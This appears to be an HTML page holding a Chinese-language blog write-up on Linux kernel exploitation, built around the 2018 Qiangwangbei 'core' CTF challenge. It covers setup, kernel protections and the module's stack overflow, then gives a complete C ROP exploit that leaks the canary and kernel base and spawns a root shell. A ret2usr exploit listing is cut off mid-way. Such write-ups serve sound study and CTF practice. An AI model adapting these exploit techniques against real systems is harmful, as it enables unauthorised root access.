@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Sivona">
+
+
+
+
+
+<title>linux kernel pwn | Sivona&#39;s</title>
+
+
+
+    <link rel="icon" href="/bug.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Sivona&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Sivona&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">linux kernel pwn</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Sivona</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">September 17, 2020&nbsp;&nbsp;14:53:07</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/kernel/">kernel</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <blockquote>
+<p>最近捡起了之前没学完的linux kernel pwn，听起来挺吓人的，其实和用户态libcpwn类比学起来想要入门还是比较容易的，之后会转向windows pwn，学习一下c艹、fuzz，补一下基础的东西</p>
+</blockquote>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境搭建还是比较麻烦的，我是使用Ubuntu16搭建的，之前试过Ubuntu20，但是glibc、gcc太新，有一些函数没有了导致一些东西编译失败，因为距离我搭建环境已经过去很久了，这里就不再阐述，推荐几位大师傅的文章</p>
+<p><a href="https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE" target="_blank" rel="noopener">https://veritas501.space/2018/06/03/kernel%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE</a></p>
+<p><a href="http://pzhxbz.cn/?p=98" target="_blank" rel="noopener">http://pzhxbz.cn/?p=98</a></p>
+<p><a href="https://xz.aliyun.com/t/2306" target="_blank" rel="noopener">https://xz.aliyun.com/t/2306</a></p>
+<h3 id="内核源码"><a href="#内核源码" class="headerlink" title="内核源码"></a>内核源码</h3><p>可以在这个网站查看各个版本的内核源码</p>
+<p><a href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/tty.h" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/tty.h</a></p>
+<h2 id="内核保护机制"><a href="#内核保护机制" class="headerlink" title="内核保护机制"></a>内核保护机制</h2><ul>
+<li><p>smep: Supervisor Mode Execution Protection，当处理器处于 ring 0 模式，执行用户空间的代码会触发页错误。（在 arm 中该保护称为 PXN)</p>
+</li>
+<li><p>smap: Superivisor Mode Access Protection，类似于 smep，当处理器处于 ring 0 模式，访问用户空间的数据会触发页错误。</p>
+</li>
+<li><p>MMAP_MIN_ADDR：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</p>
+</li>
+<li><p>KASLR：Kernel Address Space Layout Randomization(内核地址空间布局随机化)，开启后，允许kernel image加载到VMALLOC区域的任何位置。</p>
+</li>
+</ul>
+<h2 id="2018-强网杯-core-之-ROP-amp-amp-ret2usr"><a href="#2018-强网杯-core-之-ROP-amp-amp-ret2usr" class="headerlink" title="2018 强网杯 - core 之 ROP &amp;&amp; ret2usr"></a>2018 强网杯 - core 之 ROP &amp;&amp; ret2usr</h2><h3 id="做题准备"><a href="#做题准备" class="headerlink" title="做题准备"></a>做题准备</h3><p>ctf中的linux kernel pwn一般会给这几个文件：</p>
+<ul>
+<li><p>core.cpio：这是一个打包的文件，解包以后发现里面有文件系统</p>
+</li>
+<li><p>start.sh： 启动脚本，标明启动的方法、保护措施等</p>
+</li>
+<li><p>bzImage：镜像文件</p>
+</li>
+<li><p>vmlinux：内核的二进制文件，一般会打包进文件系统中，类似于libc pwn中的libc</p>
+</li>
+<li><p>*.ko：存在漏洞的LKM，一般会打包进文件系统中</p>
+</li>
+</ul>
+<blockquote>
+<p>如果没有提供vmlinux，使用以下命令获取</p>
+</blockquote>
+<blockquote>
+<p>~/linux-4.20/scripts/extract-vmlinux ./bzImage &gt; vmlinux</p>
+</blockquote>
+<p>解包命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idm &lt; .&#x2F;core.cpio</span><br></pre></td></tr></table></figure>
+<p>打包命令:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format&#x3D;newc &gt; ..&#x2F;core.cpio</span><br></pre></td></tr></table></figure>
+
+
+<p>首先我们新建一个目录并将文件系统解包进去，每次对文件系统有修改时都要重新打包。</p>
+<p>文件系统中有一个叫init的文件(也有可能叫其他名字)，该文件会在加载内核时对内核进行初始化</p>
+<p>以该题为例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line">mount -t proc proc &#x2F;proc</span><br><span class="line">mount -t sysfs sysfs &#x2F;sys</span><br><span class="line">mount -t devtmpfs none &#x2F;dev</span><br><span class="line">&#x2F;sbin&#x2F;mdev -s</span><br><span class="line">mkdir -p &#x2F;dev&#x2F;pts</span><br><span class="line">mount -vt devpts -o gid&#x3D;4,mode&#x3D;620 none &#x2F;dev&#x2F;pts</span><br><span class="line">chmod 666 &#x2F;dev&#x2F;ptmx</span><br><span class="line">cat &#x2F;proc&#x2F;kallsyms &gt; &#x2F;tmp&#x2F;kallsyms</span><br><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;kptr_restrict</span><br><span class="line">echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod &#x2F;core.ko</span><br><span class="line"></span><br><span class="line">#poweroff -d 120 -f &amp;</span><br><span class="line">#setsid &#x2F;bin&#x2F;cttyhack setuidgid 1000 &#x2F;bin&#x2F;sh</span><br><span class="line">setsid &#x2F;bin&#x2F;cttyhack setuidgid 0 &#x2F;bin&#x2F;sh</span><br><span class="line">echo &#39;sh end!\n&#39;</span><br><span class="line">umount &#x2F;proc</span><br><span class="line">umount &#x2F;sys</span><br><span class="line"></span><br><span class="line">#poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p><strong>setsid /bin/cttyhack setuidgid 0 /bin/sh</strong> 设自己为root，方便查看各种地址</p>
+</li>
+<li><p><strong>cat /proc/kallsyms &gt; /tmp/kallsyms</strong> 将kallsyms 的内容保存到了 /tmp/kallsyms 中，那么我们就能从 /tmp/kallsyms 中读取 commit_creds，prepare_kernel_cred 的函数的地址了</p>
+</li>
+<li><p><strong>echo 1 &gt; /proc/sys/kernel/kptr_restrict</strong> 将 kptr_restrict 设为 1，这样就不能通过 /proc/kallsyms 查看函数地址了，但我们可以通过/tmp/kallsyms读</p>
+</li>
+<li><p><strong>echo 1 &gt; /proc/sys/kernel/dmesg_restrict</strong>把 dmesg_restrict 设为 1，这样就不能通过 dmesg 查看 kernel 的信息了</p>
+</li>
+<li><p>删掉poweroff相关指令，避免定时关机</p>
+</li>
+</ul>
+<h3 id="开启保护"><a href="#开启保护" class="headerlink" title="开启保护"></a>开启保护</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sivona@girlfriend:~&#x2F;ctf-challenges&#x2F;pwn&#x2F;kernel&#x2F;QWB2018-core&#x2F;core$ checksec core.ko </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;sivona&#x2F;ctf-challenges&#x2F;pwn&#x2F;kernel&#x2F;QWB2018-core&#x2F;core&#x2F;core.ko&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到驱动文件开启了canary</p>
+<p>再来看一下qemu的启动参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sivona@girlfriend:~&#x2F;ctf-challenges&#x2F;pwn&#x2F;kernel&#x2F;QWB2018-core$ cat start.sh </span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel .&#x2F;bzImage \</span><br><span class="line">-initrd  .&#x2F;core.cpio \</span><br><span class="line">-append &quot;root&#x3D;&#x2F;dev&#x2F;ram rw console&#x3D;ttyS0 oops&#x3D;panic panic&#x3D;1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id&#x3D;t0, -device e1000,netdev&#x3D;t0,id&#x3D;nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>
+
+<p>可以看到开启了kaslr</p>
+<blockquote>
+<p>-s代表会在:1234起一个gdbserver</p>
+</blockquote>
+<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p><strong>init_module()</strong> 注册了/proc/core，并且绑定了core_write() core_ioctl() core_release()</p>
+<p><strong>core_ioctl()</strong> 有个switch结构可以执行三个操作</p>
+<p><strong>core_copy_func()</strong> 将全局变量name的内容复制到栈上，但是复制多少字节由我们决定，虽然这里有对字节数的check，但是可以通过负数绕过从而实现栈溢出</p>
+<p><strong>core_read()</strong> 可以将内核栈中的数据复制给用户空间的地址，以此实现泄露canary、绕过kaslr等</p>
+<p><strong>core_write()</strong> 可以给全局变量name赋值，在此写入rop</p>
+<h3 id="漏洞利用之rop"><a href="#漏洞利用之rop" class="headerlink" title="漏洞利用之rop"></a>漏洞利用之rop</h3><h4 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h4><p>通过rop执行 <strong>commit_creds(prepare_kernel_cred(0))</strong> 可以使进程权限提升为root，类似于libc pwm中的system(“/bin/sh”)</p>
+<p>然后返回用户态起shell</p>
+<blockquote>
+<p>为什么要返回用户态呢？</p>
+</blockquote>
+<blockquote>
+<p>因为在用户态许多事情会变得简单，而在内核态会很麻烦。</p>
+</blockquote>
+<h4 id="泄露-vmlinux-基地址"><a href="#泄露-vmlinux-基地址" class="headerlink" title="泄露 vmlinux 基地址"></a>泄露 vmlinux 基地址</h4><p>通过leak栈上的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffc900000dbe90 —▸ 0xffffffff8118ecfa (do_vfs_ioctl+138) ◂— cmp    eax, 0xfffffdfd</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap 0xffffffff8118ecfa</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">0xffffffff81000000 0xffffffff81c0b000 r-xp   c0b000 0      &lt;qemu&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者checksec在没开启kaslr的情况下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sivona@girlfriend:~&#x2F;ctf-challenges&#x2F;pwn&#x2F;kernel&#x2F;QWB2018-core&#x2F;core$ checksec vmlinux </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;sivona&#x2F;ctf-challenges&#x2F;pwn&#x2F;kernel&#x2F;QWB2018-core&#x2F;core&#x2F;vmlinux&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    Version:  4.15.8</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0xffffffff81000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<h4 id="泄露-commit-creds-、prepare-kernel-cred"><a href="#泄露-commit-creds-、prepare-kernel-cred" class="headerlink" title="泄露 commit_creds()、prepare_kernel_cred()"></a>泄露 commit_creds()、prepare_kernel_cred()</h4><p>使用以下命令获取 commit_creds()、prepare_kernel_cred() 函数地址，但注意考虑kaslr</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;kallsyms | grep commit_creds </span><br><span class="line">cat &#x2F;proc&#x2F;kallsyms | grep prepare_kernel_cred</span><br></pre></td></tr></table></figure>
+
+<h4 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h4><p>通过 <strong>swapgs</strong> 切换GS寄存器的值为用户态的值</p>
+<p>然后恢复进入内核态之前保存的寄存器的值，注意rip应恢复为system(“/bin/sh”)，这里可以通过内联汇编在进入内核态之前保存相关寄存器的值。</p>
+<h4 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h4><p>ubuntu16 不行!</p>
+<p>ubuntu20 行!</p>
+<p>ROPgadget 相对于ropper 前者速度比较快 输出的好像也比较多 但是有些指令没有 比如 <strong>iretq</strong></p>
+<p>将gadget保存起来备用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary .&#x2F;vmlinux --all &gt; gadgets1</span><br><span class="line">python3 ..&#x2F;Ropper&#x2F;Ropper.py --file .&#x2F;vmlinux --nocolor &gt; gadgets2</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="漏洞利用之ret2usr"><a href="#漏洞利用之ret2usr" class="headerlink" title="漏洞利用之ret2usr"></a>漏洞利用之ret2usr</h3><p>ret2usr 攻击利用了 用户空间的进程不能访问内核空间，但内核空间能访问用户空间 这个特性来定向内核代码或数据流指向用户控件，以 ring 0 特权执行用户空间代码完成提权等操作。</p>
+<p>利用思路也是用过rop控制程序执行流，不同的是直接ret到用户态的函数，那么我们就可以通过函数指针调用 <strong>commit_creds(prepare_kernel_cred(0))</strong> ，就不需要再在内核中找gadget去调用</p>
+<p>当然这种利用方式实在没有开启SMEP保护的情况下才可以实现。</p>
+<blockquote>
+<p>下面一个题会介绍如何 bypass SMEP</p>
+</blockquote>
+<h3 id="使用gdb动态调试"><a href="#使用gdb动态调试" class="headerlink" title="使用gdb动态调试"></a>使用gdb动态调试</h3><p>之前说过在start.sh中的 <strong>-s</strong> 参数在 :1234 开启了一个gdbserver，如果端口被占也可以通过 <strong>-gdb tcp::1234</strong> 指定端口</p>
+<p>待qemu启动后，在gdb中使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote :1234</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取符号"><a href="#获取符号" class="headerlink" title="获取符号"></a>获取符号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F; $ cat sys&#x2F;module&#x2F;core&#x2F;sections&#x2F;.</span><br><span class="line">.bss                       .orc_unwind</span><br><span class="line">.data                      .orc_unwind_ip</span><br><span class="line">.exit.text                 .rodata.str1.1</span><br><span class="line">.gnu.linkonce.this_module  .strtab</span><br><span class="line">.init.text                 .symtab</span><br><span class="line">.note.gnu.build-id         .text</span><br></pre></td></tr></table></figure>
+<p>使用以上命令获取.text .bss .data段地址，然后在gdb中使用 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file .&#x2F;core.ko 0xffffffffc0000000 -s .bss 0xffffffffc0002400 -s .data 0xffffffffc0002000</span><br></pre></td></tr></table></figure>
+<h3 id="rop-exp"><a href="#rop-exp" class="headerlink" title="rop-exp"></a>rop-exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;gcc exp.c -static -masm&#x3D;intel -g -o exp</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stropts.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;stat.h&gt;</span><br><span class="line"></span><br><span class="line">void spawn_shell()</span><br><span class="line">&#123;</span><br><span class="line">    if(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(&quot;&#x2F;bin&#x2F;sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        puts(&quot;[*]spawn shell error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">size_t commit_creds &#x3D; 0x9c8e0;</span><br><span class="line">size_t prepare_kernel_cred &#x3D; 0x9cce0;</span><br><span class="line">size_t raw_vmlinux &#x3D; 0xffffffff81000000;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; intel flavor assembly</span><br><span class="line">size_t user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line">void save_status()&#123;</span><br><span class="line">    __asm__(&quot;mov user_cs, cs;&quot;</span><br><span class="line">            &quot;mov user_ss, ss;&quot;</span><br><span class="line">            &quot;mov user_sp, rsp;&quot;</span><br><span class="line">            &quot;pushf;&quot;</span><br><span class="line">            &quot;pop user_rflags;&quot;</span><br><span class="line">            );</span><br><span class="line">    puts(&quot;[*]status has been saved.&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void core_read(int fd,char* buf)&#123;</span><br><span class="line">    ioctl(fd,0x6677889B,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void set_off(int fd,int off)&#123;</span><br><span class="line">    ioctl(fd,0x6677889C,off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void core_copy_func(int fd,size_t size)&#123;</span><br><span class="line">    ioctl(fd,0x6677889A,size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    int fd &#x3D; open(&quot;&#x2F;proc&#x2F;core&quot;,2);</span><br><span class="line">    if(fd &#x3D;&#x3D; -1)&#123;</span><br><span class="line">        printf(&quot;fd: %d&quot;,fd);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;*leak*&#x2F;</span><br><span class="line">    size_t buf[0x100] &#x3D; &#123;0&#125;;</span><br><span class="line">    set_off(fd,0x40);</span><br><span class="line">    core_read(fd,buf);</span><br><span class="line">    for(int i&#x3D;0;i&lt;8;i++)&#123;</span><br><span class="line">        printf(&quot;buf[%d]: &quot;,i);</span><br><span class="line">        printf(&quot;%p\n&quot;,buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    size_t canary &#x3D; buf[0];</span><br><span class="line">    size_t vmlinux_base &#x3D; buf[7] - 0x18ECFA;</span><br><span class="line">    size_t ko_base &#x3D; buf[2] - 0x19B;</span><br><span class="line">    printf(&quot;canary:%p\n&quot;,canary);</span><br><span class="line">    printf(&quot;vmlinux_base:%p\n&quot;,vmlinux_base);</span><br><span class="line">    printf(&quot;ko_base:%p\n&quot;,ko_base);</span><br><span class="line">    &#x2F;*leak end*&#x2F;</span><br><span class="line"></span><br><span class="line">    size_t rop[0x100] &#x3D; &#123;0&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    for(i&#x3D;0;i&lt;10;i++)</span><br><span class="line">        rop[i] &#x3D; canary;</span><br><span class="line">    size_t offset &#x3D; vmlinux_base - raw_vmlinux;</span><br><span class="line">    rop[i++] &#x3D; 0xffffffff81000b2f + offset; &#x2F;&#x2F; pop rdi ; ret</span><br><span class="line">    rop[i++] &#x3D; 0;</span><br><span class="line">    rop[i++] &#x3D; prepare_kernel_cred+vmlinux_base;</span><br><span class="line">    rop[i++] &#x3D; 0xffffffff811e8932 + offset; &#x2F;&#x2F;pop r8; ret;</span><br><span class="line">    rop[i++] &#x3D; commit_creds+vmlinux_base;</span><br><span class="line">    rop[i++] &#x3D; 0xffffffff812852d7 + offset; &#x2F;&#x2F;mov rdi, rax; call r8; add rsp, 0x10; ret;</span><br><span class="line">    rop[i++] &#x3D; 0;</span><br><span class="line">    rop[i++] &#x3D; 0;</span><br><span class="line">    rop[i++] &#x3D; 0xffffffff81a012da + offset; &#x2F;&#x2F; swapgs; popfq; ret</span><br><span class="line">    rop[i++] &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    rop[i++] &#x3D; 0xffffffff81050ac2 + offset; &#x2F;&#x2F; iretq; ret; </span><br><span class="line"></span><br><span class="line">    rop[i++] &#x3D; (size_t)spawn_shell;         &#x2F;&#x2F; rip </span><br><span class="line"></span><br><span class="line">    rop[i++] &#x3D; user_cs;</span><br><span class="line">    rop[i++] &#x3D; user_rflags;</span><br><span class="line">    rop[i++] &#x3D; user_sp;</span><br><span class="line">    rop[i++] &#x3D; user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd,rop,sizeof(rop));</span><br><span class="line">    core_copy_func(fd,0xFFFFFFFFFFFF0100);</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="ret2usr-exp"><a href="#ret2usr-exp" class="headerlink" title="ret2usr-exp"></a>ret2usr-exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 